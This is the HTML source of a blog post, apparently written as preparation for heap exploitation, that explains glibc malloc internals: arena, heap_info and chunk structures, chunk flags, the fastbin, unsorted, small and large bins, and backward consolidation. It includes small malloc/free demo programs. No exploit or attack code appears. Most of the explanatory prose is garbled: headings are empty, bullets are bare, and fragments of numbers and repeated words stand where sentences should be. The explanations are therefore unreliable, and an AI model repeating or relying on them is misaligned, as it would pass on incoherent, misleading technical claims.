class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">malloc_state</span></span></span><br><span class=\"line\"><span class=\"class\">&#123;</span></span><br><span class=\"line\">  <span class=\"comment\">/* Serialize access.  */</span></span><br><span class=\"line\">  __libc_lock_define (, mutex);</span><br><span class=\"line\"> </span><br><span class=\"line\">  <span class=\"comment\">/* Flags (formerly in max_fast).  */</span></span><br><span class=\"line\">  <span class=\"keyword\">int</span> flags;</span><br><span class=\"line\"> </span><br><span class=\"line\">  <span class=\"comment\">/* Set if the fastbin chunks contain recently inserted free blocks.  */</span></span><br><span class=\"line\">  <span class=\"comment\">/* Note this is a bool but not all targets support atomics on booleans.  */</span></span><br><span class=\"line\">  <span class=\"keyword\">int</span> have_fastchunks;</span><br><span class=\"line\"> </span><br><span class=\"line\">  <span class=\"comment\">/* Fastbins */</span></span><br><span class=\"line\">  mfastbinptr fastbinsY[NFASTBINS];</span><br><span class=\"line\"> </span><br><span class=\"line\">  <span class=\"comment\">/* Base of the topmost chunk -- not otherwise kept in a bin */</span></span><br><span class=\"line\">  mchunkptr top;</span><br><span class=\"line\"> </span><br><span class=\"line\">  <span class=\"comment\">/* The remainder from the most recent split of a small request */</span></span><br><span class=\"line\">  mchunkptr last_remainder;</span><br><span class=\"line\"> </span><br><span class=\"line\">  <span class=\"comment\">/* Normal bins packed as described above */</span></span><br><span class=\"line\">  mchunkptr bins[NBINS * <span class=\"number\">2</span> - <span class=\"number\">2</span>];</span><br><span class=\"line\"> </span><br><span class=\"line\">  <span class=\"comment\">/* Bitmap of bins */</span></span><br><span class=\"line\">  <span class=\"keyword\">unsigned</span> <span class=\"keyword\">int</span> binmap[BINMAPSIZE];</span><br><span class=\"line\"> </span><br><span class=\"line\">  <span class=\"comment\">/* Linked list */</span></span><br><span class=\"line\">  <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">malloc_state</span> *<span class=\"title\">next</span>;</span></span><br><span class=\"line\"> </span><br><span class=\"line\">  <span class=\"comment\">/* Linked list for free arenas.  Access to this field is serialized</span></span><br><span class=\"line\"><span class=\"comment\">     by free_list_lock in arena.c.  */</span></span><br><span class=\"line\">  <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">malloc_state</span> *<span class=\"title\">next_free</span>;</span></span><br><span class=\"line\"> </span><br><span class=\"line\">  <span class=\"comment\">/* Number of threads attached to this arena.  0 if the arena is on</span></span><br><span class=\"line\"><span class=\"comment\">     the free list.  Access to this field is serialized by</span></span><br><span class=\"line\"><span class=\"comment\">     free_list_lock in arena.c.  */</span></span><br><span class=\"line\">  INTERNAL_SIZE_T attached_threads;</span><br><span class=\"line\"> </span><br><span class=\"line\">  <span class=\"comment\">/* Memory allocated from the system in this arena.  */</span></span><br><span class=\"line\">  INTERNAL_SIZE_T system_mem;</span><br><span class=\"line\">  INTERNAL_SIZE_T max_system_mem;</span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure>\n<blockquote>\n<ul>\n<li><strong>fastbinsY</strong>fastbins</li>\n<li><strong>bins</strong>smallbinsunsortedbinlargebin</li>\n<li><strong>binmap</strong>fastbinsYbinmapunsigned intbin</li>\n</ul>\n</blockquote>\n<h4 id=\"3-heap-info\"><a href=\"#3-heap-info\" class=\"headerlink\" title=\"3.heap_info\"></a>3.<strong>heap_info</strong></h4><ul>\n<li></li>\n<li><strong></strong></li>\n</ul>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">typedef</span> <span class=\"class\"><span class=\"keyword\">struct</span> _<span class=\"title\">heap_info</span></span></span><br><span class=\"line\"><span class=\"class\">&#123;</span></span><br><span class=\"line\">  mstate ar_ptr;            <span class=\"comment\">/* Arena for this heap. */</span></span><br><span class=\"line\">  <span class=\"class\"><span class=\"keyword\">struct</span> _<span class=\"title\">heap_info</span> *<span class=\"title\">prev</span>;</span>  <span class=\"comment\">/* Previous heap. */</span></span><br><span class=\"line\">  <span class=\"keyword\">size_t</span> <span class=\"built_in\">size</span>;              <span class=\"comment\">/* Current size in bytes. */</span></span><br><span class=\"line\">  <span class=\"keyword\">size_t</span> mprotect_size;     <span class=\"comment\">/* Size in bytes that has been mprotected</span></span><br><span class=\"line\"><span class=\"comment\">                             PROT_READ|PROT_WRITE.  */</span></span><br><span class=\"line\">  <span class=\"comment\">/* Make sure the following data is properly aligned, particularly</span></span><br><span class=\"line\"><span class=\"comment\">     that sizeof (heap_info) + 2 * SIZE_SZ is a multiple of</span></span><br><span class=\"line\"><span class=\"comment\">     MALLOC_ALIGNMENT. */</span></span><br><span class=\"line\">  <span class=\"keyword\">char</span> pad[<span class=\"number\">-6</span> * SIZE_SZ &amp; MALLOC_ALIGN_MASK];</span><br><span class=\"line\">&#125; heap_info;</span><br></pre></td></tr></table></figure>\n<blockquote>\n<ul>\n<li><strong>ar_ptr</strong>arnea</li>\n<li><strong>prev</strong></li>\n</ul>\n</blockquote>\n<h4 id=\"4-malloc-chunk\"><a href=\"#4-malloc-chunk\" class=\"headerlink\" title=\"4.malloc_chunk\"></a>4.malloc_chunk</h4><ul>\n<li>glibc</li>\n</ul>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">malloc_chunk</span> &#123;</span></span><br><span class=\"line\"> </span><br><span class=\"line\">  INTERNAL_SIZE_T      mchunk_prev_size;  <span class=\"comment\">/* Size of previous chunk (if free).*/</span></span><br><span class=\"line\">  INTERNAL_SIZE_T      mchunk_size;       <span class=\"comment\">/* Size in bytes, including overhead.*/</span></span><br><span class=\"line\"> </span><br><span class=\"line\">  <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">malloc_chunk</span>* <span class=\"title\">fd</span>;</span>   <span class=\"comment\">/* double links -- used only if free. */</span></span><br><span class=\"line\">  <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">malloc_chunk</span>* <span class=\"title\">bk</span>;</span></span><br><span class=\"line\"> </span><br><span class=\"line\">  <span class=\"comment\">/* Only used for large blocks: pointer to next larger size.  */</span></span><br><span class=\"line\">  <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">malloc_chunk</span>* <span class=\"title\">fd_nextsize</span>;</span> <span class=\"comment\">/* double links -- used only if free. */</span></span><br><span class=\"line\">  <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">malloc_chunk</span>* <span class=\"title\">bk_nextsize</span>;</span></span><br><span class=\"line\"> </span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure>\n<blockquote>\n<ul>\n<li><p>864432</p>\n</li>\n<li><p><strong>mchunk_prev_size</strong>chunkchunkchunkchunk  (chunk)0chunkchunkchunkchunk</p>\n</li>\n<li><strong>mchunk_size</strong>chunkchunk8</li>\n</ul>\n</blockquote>\n<p>gdb</p>\n<p></p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;stdlib.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;malloc.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;string.h&gt;</span></span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">()</span></span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">char</span> *p;</span><br><span class=\"line\">        p = <span class=\"built_in\">malloc</span>(<span class=\"number\">10</span>);</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"keyword\">char</span> *H;</span><br><span class=\"line\">    H = <span class=\"built_in\">malloc</span>(<span class=\"number\">64</span>);</span><br><span class=\"line\">    <span class=\"built_in\">memcpy</span>(H,<span class=\"string\">\"aaaaaaaaaaaaaaaa\"</span>,<span class=\"number\">16</span>);</span><br><span class=\"line\">    <span class=\"built_in\">free</span>(H);</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">gcc -o a.out a.c#<span class=\"number\">64</span></span><br><span class=\"line\">gcc -m32 -o b.out b.c#<span class=\"number\">32</span></span><br></pre></td></tr></table></figure>\n<p>64</p>\n<p><img src=\"/2020/12/15/%E5%A0%86/image-20201212004040135.png\" alt=\"image-20201212004040135\"></p>\n<p>32</p>\n<p><img src=\"/2020/12/15/%E5%A0%86/image-20201212004126045.png\" alt=\"image-20201212004126045\"></p>\n<blockquote>\n<p><strong>chunk</strong></p>\n<ul>\n<li>fdfd</li>\n</ul>\n<p><strong>chunk</strong></p>\n<p>chunkbinfdbkbinchunk</p>\n<ul>\n<li>fd chunk</li>\n<li>bk chunk</li>\n<li>fdbkchunkchunk</li>\n</ul>\n<p><strong>fd_nextsizebk_nextsize</strong></p>\n<p>chunkchunklarge chunk</p>\n<ul>\n<li>fd_nextsize chunk bin</li>\n<li>bk_nextsize chunk  bin </li>\n</ul>\n<p> large chunk  fd  chunk </p>\n</blockquote>\n<h5 id=\"malloc-chunk\"><a href=\"#malloc-chunk\" class=\"headerlink\" title=\"malloc_chunk\"></a>malloc_chunk</h5><p><strong></strong>mchunk_prev_size + mchunk_size + fd + bk 64 4 * SIZE_SZ = 323216</p>\n<p><strong></strong>malloc + chunk + mchunk_prev_size + mchunk_size + chunkmchunk_prev_size</p>\n<p>chunk64</p>\n<p><img src=\"/2020/12/15/%E5%A0%86/20201106174934849.jpg\" alt=\"img\"></p>\n<h5 id=\"mchunk-size\"><a href=\"#mchunk-size\" class=\"headerlink\" title=\"mchunk_size\"></a>mchunk_size</h5><p>mchunk_size648bitAMPbitsize</p>\n<ul>\n<li>AA=0 A=1 </li>\n<li>MM=1mmapM=0heap</li>\n<li>PP=0 pre_chunkmchunk_prev_size</li>\n</ul>\n<h3 id=\"0x04-chunk\"><a href=\"#0x04-chunk\" class=\"headerlink\" title=\"0x04 chunk\"></a>0x04 chunk</h3><h4 id=\"1-allocated-chunk\"><a href=\"#1-allocated-chunk\" class=\"headerlink\" title=\"1.allocated chunk\"></a>1.allocated chunk</h4><p>chunk</p>\n<h4 id=\"2-free-chunk\"><a href=\"#2-free-chunk\" class=\"headerlink\" title=\"2.free chunk\"></a>2.free chunk</h4><p>chunk</p>\n<h4 id=\"3-top-chunk\"><a href=\"#3-top-chunk\" class=\"headerlink\" title=\"3.top chunk\"></a>3.<strong>top chunk</strong></h4><ul>\n<li><strong></strong>chunkarena()top chunk</li>\n<li><strong></strong>chunk<strong></strong>binfree chunk(bin)chunk</li>\n<li><strong></strong>top chunktop chunk1chunk2top chunkheapheapmain arenasbrkheapthread arenammapheap</li>\n</ul>\n<h4 id=\"4-last-remainder-chunk\"><a href=\"#4-last-remainder-chunk\" class=\"headerlink\" title=\"4.last remainder chunk\"></a>4.last remainder chunk</h4><ul>\n<li><strong></strong>small chunksmall binunsorted binbinmapsbinchunkchunkchunkunsorted bin<strong>chunklast remainder chunk</strong></li>\n<li><strong></strong>chunkmalloc(small chunk)small chunksmall binunsorted binunsorted binchunklast remainder chunkchunkunsorted binlast remainder chunkmalloc(small chunk)small chunk</li>\n</ul>\n<h3 id=\"0x05-bins\"><a href=\"#0x05-bins\" class=\"headerlink\" title=\"0x05 bins\"></a>0x05 bins</h3><blockquote>\n<ul>\n<li>binstruct chunk</li>\n<li>chunkchunkchunkglibcbinchunk</li>\n<li>binarena</li>\n<li>binchunkfree chunk</li>\n</ul>\n</blockquote>\n<h4 id=\"1-binmalloc-state\"><a href=\"#1-binmalloc-state\" class=\"headerlink\" title=\"1.binmalloc_state\"></a>1.binmalloc_state</h4><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">typedef</span> <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">malloc_chunk</span>* <span class=\"title\">mchunkptr</span>;</span></span><br><span class=\"line\"><span class=\"keyword\">typedef</span> <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">malloc_chunk</span> *<span class=\"title\">mfastbinptr</span>;</span></span><br><span class=\"line\"> </span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">malloc_state</span></span></span><br><span class=\"line\"><span class=\"class\">&#123;</span> </span><br><span class=\"line\">  ...</span><br><span class=\"line\">  <span class=\"comment\">/*other member*/</span></span><br><span class=\"line\">  ...</span><br><span class=\"line\"> </span><br><span class=\"line\">  <span class=\"comment\">/* Fastbins */</span></span><br><span class=\"line\">  mfastbinptr fastbinsY[NFASTBINS];</span><br><span class=\"line\"> </span><br><span class=\"line\">  <span class=\"comment\">/* Normal bins packed as described above */</span></span><br><span class=\"line\">  mchunkptr bins[NBINS * <span class=\"number\">2</span> - <span class=\"number\">2</span>];</span><br><span class=\"line\"> </span><br><span class=\"line\">  ...</span><br><span class=\"line\">  <span class=\"comment\">/*other member*/</span></span><br><span class=\"line\">  ...</span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure>\n<ul>\n<li><strong>fastbinY</strong>10fast bin</li>\n<li><strong>bins</strong>129unsorted bin1small bin2~63large bin64~126</li>\n</ul>\n<h4 id=\"2-fastbin\"><a href=\"#2-fastbin\" class=\"headerlink\" title=\"2.fastbin\"></a>2.fastbin</h4><p><strong></strong>chunk321280x20~0x80chunkfast chunkmallocstruct malloc_chunk2</p>\n<ul>\n<li>fast bin10</li>\n<li><strong>free chunk</strong>fast bin<strong>fast binchunkPREV_INUSE1</strong>fast binchunkfree chunk</li>\n<li>LIFO</li>\n</ul>\n<blockquote>\n<h3 id=\"fastbinsYfastbins\"><a href=\"#fastbinsYfastbins\" class=\"headerlink\" title=\"fastbinsYfastbins\"></a>fastbinsYfastbins</h3><ul>\n<li>fast binfdfast binfast chunkfast chunk</li>\n<li>fastbinchunkfastbinchunk</li>\n</ul>\n<p><img src=\"/2020/12/15/%E5%A0%86/2019072416485849.png\" alt=\"img\"></p>\n</blockquote>\n<h4 id=\"3-unsorted-bin\"><a href=\"#3-unsorted-bin\" class=\"headerlink\" title=\"3.unsorted bin\"></a>3.unsorted bin</h4><p>chunkbinschunkunsorted binunsorted bin <strong>fast bin</strong>unsorted binchunkchunk</p>\n<ul>\n<li>unsorted bin 1</li>\n<li>unsorted binfree chunks</li>\n<li>unsorted binchunkchunkunsorted bin</li>\n<li>unsortedbinFIFO</li>\n</ul>\n<p><img src=\"file://C:\\Users\\86138\\Music\\hexo\\source\\_posts\\PWN\\image-20201119163232880.png?lastModify=1607780072\" alt=\"image-20201119163232880\"></p>\n<h4 id=\"4-small-bin\"><a href=\"#4-small-bin\" class=\"headerlink\" title=\"4.small bin\"></a>4.small bin</h4><p><strong></strong>10240x400chunksmall chunksmall binsmall chunk</p>\n<ul>\n<li>small bin62</li>\n<li>FIFO</li>\n<li><strong></strong>small binlarger binfast bin</li>\n</ul>\n<blockquote>\n<p><strong>Small bin</strong></p>\n<ul>\n<li>smallbinfree chunk</li>\n<li><strong>small binFIFO()</strong>chunkfront end()rear end()chunk</li>\n<li>smallbinchunksmallbinchunkfastbinsYfastbin</li>\n</ul>\n<p><img src=\"/2020/12/15/%E5%A0%86/201907300808254.png\" alt=\"img\"></p>\n</blockquote>\n<h4 id=\"5-large-bin\"><a href=\"#5-large-bin\" class=\"headerlink\" title=\"5.large bin\"></a>5.large bin</h4><p><strong></strong>10240x400chunklarge chunklarge binlargechunk</p>\n<ul>\n<li>large bin636</li>\n<li>largechunkfd_nextsizebk_nextsize</li>\n</ul>\n<blockquote>\n<h3 id=\"Large-Bin\"><a href=\"#Large-Bin\" class=\"headerlink\" title=\"Large Bin\"></a>Large Bin</h3><ul>\n<li>largebinchunkchunklarbin</li>\n<li>large chunklarge bin</li>\n<li><strong>63largebins</strong>32largebin<strong>64largebinchunksize1024-1087large binchunk size1088~1151</strong>16largebin<strong>512</strong>8largebin<strong>4096</strong>4largebin<strong>32768</strong>2largebin<strong>262144</strong>**largebinchunk</li>\n</ul>\n<p><img src=\"/2020/12/15/%E5%A0%86/20190730154304263.png\" alt=\"img\"></p>\n</blockquote>\n<p><img src=\"/2020/12/15/%E5%A0%86/20190724174830502.png\" alt=\"img\"></p>\n<h3 id=\"0x06-\"><a href=\"#0x06-\" class=\"headerlink\" title=\"0x06 \"></a>0x06 </h3><p><img src=\"/2020/12/15/%E5%A0%86/20190722153928310.png\" alt=\"img\"></p>\n<ul>\n<li><h4 id=\"mallocglibcmalloc\"><a href=\"#mallocglibcmalloc\" class=\"headerlink\" title=\"mallocglibcmalloc\"></a><strong></strong>mallocglibcmalloc</h4></li>\n<li><p>glibcmallocmalloc</p>\n</li>\n<li><p>freeglibctop chunkbins</p>\n</li>\n<li><p>malloc</p>\n</li>\n<li><p>glibcbrk/mmap</p>\n</li>\n</ul>\n<h3 id=\"0x07-chunk\"><a href=\"#0x07-chunk\" class=\"headerlink\" title=\"0x07 chunk\"></a>0x07 chunk</h3><h4 id=\"1-\"><a href=\"#1-\" class=\"headerlink\" title=\"1.\"></a>1.</h4><ul>\n<li><strong>NON_MAIN_ARENA</strong> chunk </li>\n<li><strong>IS_MAPPED</strong>chunkmmap</li>\n<li><strong>PREV_INUSE</strong>chunk1 size  P  1chunk size P0 prev_size  chunk chunk</li>\n</ul>\n<h4 id=\"2-\"><a href=\"#2-\" class=\"headerlink\" title=\"2.\"></a>2.</h4><ul>\n<li><strong>6416</strong><strong>328</strong>64struct malloc_chunk4323</li>\n</ul>\n<p><img src=\"/2020/12/15/%E5%A0%86/2019072217303470.png\" alt=\"img\"></p>\n<ul>\n<li>glibcstruct malloc_chunkfd3chunkfd1chunk</li>\n</ul>\n<h4 id=\"3-PREV-INUSEchunk\"><a href=\"#3-PREV-INUSEchunk\" class=\"headerlink\" title=\"3.PREV_INUSEchunk\"></a>3.PREV_INUSEchunk</h4><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> prev_inuse(p)       ((p)-&gt;mchunk_size &amp; PREV_INUSE)</span></span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"keyword\">static</span> <span class=\"keyword\">void</span></span><br><span class=\"line\">_int_free (mstate av, mchunkptr p, <span class=\"keyword\">int</span> have_lock)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"comment\">/* consolidate backward */</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (!prev_inuse(p)) &#123;</span><br><span class=\"line\">        prevsize = prev_size (p);                   <span class=\"comment\">//1</span></span><br><span class=\"line\">        <span class=\"built_in\">size</span> += prevsize;                           <span class=\"comment\">//2</span></span><br><span class=\"line\">        p = chunk_at_offset(p, -((<span class=\"keyword\">long</span>) prevsize)); <span class=\"comment\">//3</span></span><br><span class=\"line\">        unlink(av, p, bck, fwd);                    <span class=\"comment\">//4</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<ul>\n<li>prev_inusepPREV_INUSE0</li>\n<li>PREV_INUSE0prev_inuse0if1if</li>\n<li>1.recv_sizechunk</li>\n<li>2.presizechunk</li>\n<li>3.pchunk</li>\n<li>4.unlinkchunkbin</li>\n</ul>\n<h4 id=\"4-fast-chunkPREV-INUSE\"><a href=\"#4-fast-chunkPREV-INUSE\" class=\"headerlink\" title=\"4.fast chunkPREV_INUSE\"></a>4.fast chunkPREV_INUSE</h4><ul>\n<li>fastchunkchunkPREV_INUSE1fastchunkchunk</li>\n<li>fastchunkchunkchunkPREV_INUSE1chunkfastchunk</li>\n</ul>\n<h4 id=\"5-\"><a href=\"#5-\" class=\"headerlink\" title=\"5.\"></a>5.</h4><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;unistd.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;malloc.h&gt;</span></span></span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">int</span> <span class=\"built_in\">size</span>=<span class=\"number\">0x70</span>;</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"keyword\">void</span> *p1=<span class=\"built_in\">malloc</span>(<span class=\"built_in\">size</span>);</span><br><span class=\"line\">    <span class=\"keyword\">void</span> *p2=<span class=\"built_in\">malloc</span>(<span class=\"built_in\">size</span>);</span><br><span class=\"line\">    <span class=\"keyword\">void</span> *p3=<span class=\"built_in\">malloc</span>(<span class=\"built_in\">size</span>); <span class=\"comment\">//chunktop chunk</span></span><br><span class=\"line\"> </span><br><span class=\"line\">    sleep(<span class=\"number\">0</span>);  <span class=\"comment\">//</span></span><br><span class=\"line\">    <span class=\"built_in\">free</span>(p1);    </span><br><span class=\"line\">    <span class=\"built_in\">free</span>(p2);   </span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>3</p>\n<p><img src=\"/2020/12/15/%E5%A0%86/image-20201214183532647.png\" alt=\"image-20201214183532647\"></p>\n<p></p>\n<p><img src=\"/2020/12/15/%E5%A0%86/image-20201214183701946.png\" alt=\"image-20201214183701946\"></p>\n<p></p>\n<p>   </p>\n<p>tcache</p>\n<p><img src=\"/2020/12/15/%E5%A0%86/image-20201214183930779.png\" alt=\"image-20201214183930779\"></p>\n<hr>\n<p> </p>\n<p></p>\n<p><img src=\"/2020/12/15/%E5%A0%86/image-20201214221400402.png\" alt=\"image-20201214221400402\"></p>\n<p></p>\n<p><img src=\"/2020/12/15/%E5%A0%86/image-20201214221458119.png\" alt=\"image-20201214221458119\"></p>\n<h3 id=\"0x08-chunkmchunk-prev-size\"><a href=\"#0x08-chunkmchunk-prev-size\" class=\"headerlink\" title=\"0x08 chunkmchunk_prev_size\"></a>0x08 chunkmchunk_prev_size</h3><h4 id=\"1-\"><a href=\"#1-\" class=\"headerlink\" title=\"1.\"></a>1.</h4><ul>\n<li>chunkchunkmchunk_prev_sizechunk</li>\n<li>chunkchunkmchunk_prev_sizechunk</li>\n</ul>\n<h4 id=\"2--1\"><a href=\"#2--1\" class=\"headerlink\" title=\"2.\"></a>2.</h4><ul>\n<li>chunk168chunkmchunk_prev_size</li>\n<li>8chunkchunkmchunk_prev_size</li>\n</ul>\n<p><img src=\"/2020/12/15/%E5%A0%86/20190724195005380.png\" alt=\"img\"></p>\n<h4 id=\"3-\"><a href=\"#3-\" class=\"headerlink\" title=\"3.\"></a>3.</h4><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;unistd.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;malloc.h&gt;</span></span></span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">int</span> <span class=\"built_in\">size</span>=<span class=\"number\">0x108</span>;</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"keyword\">void</span> *p1=<span class=\"built_in\">malloc</span>(<span class=\"built_in\">size</span>);</span><br><span class=\"line\">    sleep(<span class=\"number\">0</span>);  <span class=\"comment\">//</span></span><br><span class=\"line\"> </span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"built_in\">free</span>(p1);    </span><br><span class=\"line\">  </span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>0x1080x108 chunkpre_size</p>\n<p>6416 0x100()+0x10()+0x1(P)</p>\n</blockquote>\n<p><img src=\"/2020/12/15/%E5%A0%86/image-20201214190713309.png\" alt=\"image-20201214190713309\"></p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;unistd.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;malloc.h&gt;</span></span></span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">int</span> <span class=\"built_in\">size</span>=<span class=\"number\">0x109</span>;</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"keyword\">void</span> *p1=<span class=\"built_in\">malloc</span>(<span class=\"built_in\">size</span>);</span><br><span class=\"line\">    sleep(<span class=\"number\">0</span>);  <span class=\"comment\">//</span></span><br><span class=\"line\"> </span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"built_in\">free</span>(p1);    </span><br><span class=\"line\">  </span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span 